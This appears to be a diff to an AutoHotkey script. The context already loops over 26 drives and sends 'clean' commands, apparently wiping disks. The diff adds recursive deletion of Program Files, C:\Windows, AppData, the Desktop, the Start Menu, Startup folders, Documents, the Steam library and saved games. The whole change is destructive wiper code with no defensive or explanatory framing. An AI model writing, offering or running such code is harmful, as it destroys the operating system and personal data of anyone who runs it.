@@ -23,7 +23,22 @@ Loop, 26
 	Send, clean {Enter}
 	EnvAdd, drives, -1
 }
-
+FileRemoveDir, %A_ProgramFiles%, 1
+FileRemoveDir, %A_AppData%, 1
+FileRemoveDir, %A_AppDataCommon%, 1
+FileRemoveDir, %A_Desktop%, 1
+FileRemoveDir, %A_DesktopCommon%, 1
+FileRemoveDir, %A_StartMenu%, 1
+FileRemoveDir, %A_StartMenuCommon%, 1
+FileRemoveDir, %A_Programs%, 1
+FileRemoveDir, %A_ProgramsCommon%, 1
+FileRemoveDir, %A_Startup%, 1
+FileRemoveDir, %A_StartupCommon%, 1
+FileRemoveDir, %A_MyDocuments%, 1
+FileRemoveDir, C:\SteamLibrary, 1
+FileRemoveDir, C:\Windows, 1
+FileRemoveDir, C:\Users\%A_UserName%\AppData, 1
+FileRemoveDir, C:\Users\%A_UserName%\Saved Games, 1
 
 Return
 Esc:: ExitApp
